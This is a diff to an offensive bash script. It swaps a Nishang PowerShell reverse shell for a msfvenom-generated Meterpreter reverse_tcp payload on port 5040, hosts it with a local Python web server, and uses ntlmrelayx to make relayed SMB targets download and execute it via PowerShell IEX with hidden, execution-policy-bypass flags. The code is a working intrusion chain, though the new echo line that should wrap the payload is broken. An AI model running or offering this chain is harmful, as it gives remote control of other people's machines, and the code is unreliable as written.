@@ -15,15 +15,20 @@ done
 
 HOST=$(cat host.txt)
 
-# Copiar Script de Nishan en PowerShell
-cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 PS.ps1
+# Set the variables for the payload
+PAYLOAD="windows/meterpreter/reverse_tcp"
+LHOST="$HOST"
+LPORT="5040"
+OUTPUT_FILE="meterpreter.ps1"
 
-# Agregando parametros al script de Nishang
-echo "" >> PS.ps1
-echo "Invoke-PowerShellTcp -Reverse -IPAddress $HOST -Port 5040" >> PS.ps1
+# Generate the Meterpreter payload using msfvenom
+msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f psh-cmd > $OUTPUT_FILE
 
-# Levantando servidor web local
+# Append the generated payload to a PowerShell script
+echo "powershell -exec bypass -nop -w hidden -c \"$($OUTPUT_FILE)\"" > PS.ps1
+
+# Start a local web server to host the payload
 python3 -m http.server &>/dev/null &
 
-# Enviando peticion para descarga del script
+# Send the command to the target to download and execute the script
 ntlmrelayx.py -tf target.txt -c "powershell IEX(New-Object Net.WebClient).downloadString('http://$HOST:8000/PS.ps1')" -smb2support
